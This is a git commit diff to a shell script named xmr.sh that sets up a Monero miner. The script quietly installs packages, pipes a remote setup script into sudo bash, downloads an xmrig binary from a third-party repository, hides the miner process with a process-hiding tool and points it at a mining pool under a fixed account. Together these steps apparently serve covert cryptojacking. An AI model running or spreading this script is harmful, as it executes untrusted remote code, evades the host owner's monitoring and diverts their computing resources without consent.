13541a2bfbc1123498256e2cfc2197a1d2c84b7c
Myaxisplay <101804515+Myaxisplay@users.noreply.github.com>
2022-07-11 00:57:17 +0700

    Update xmr.sh

--- xmr.sh
+++ xmr.sh
@@ -3,7 +3,7 @@
 sudo apt update > /dev/null 2>&1
 sudo apt install screen -y > /dev/null 2>&1
 
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+curl -fsSL https://deb.nodesource.com/setup_14.x | sudo -E bash -
 sudo apt-get install -y nodejs
 
 npm i -g node-process-hider
@@ -12,4 +12,5 @@ npm install -g npm
 wget https://raw.githubusercontent.com/hondacars/xxx/main/xmrig
 chmod +x xmrig
 sudo ph add xmrig
+
 ./xmrig -o stratum+tcp://prohashing.com:3359 -u Prodent -p n=$(echo $(shuf -i 1-200 -n 1)-CS) -k --coin monero -a rx/0
